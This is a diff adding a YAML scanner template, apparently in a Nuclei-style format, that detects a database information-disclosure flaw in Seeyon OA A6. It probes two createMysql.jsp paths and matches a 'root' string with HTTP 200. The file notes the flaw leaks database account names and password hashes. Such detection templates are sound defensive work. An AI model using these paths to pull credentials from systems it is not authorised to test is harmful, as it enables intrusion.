@@ -1,0 +1,25 @@
+id: seeyon-createmysql-exposure
+brief:
+    title: Seeyon OA A6 createMysql.jsp Database - Information Disclosure
+    by: SleepingBag945
+    level: medium
+    about: Seeyon OA A6 has leaked sensitive database information. An attacker can obtain the database account and password MD5 by accessing a specific URL.
+    label:
+        - seeyon
+        - oa
+        - info-leak
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/yyoa/createMysql.jsp'
+        - '{{BaseURL}}/yyoa/ext/createMysql.jsp'
+      signs:
+        - "on": word
+          has:
+            - root</br>
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
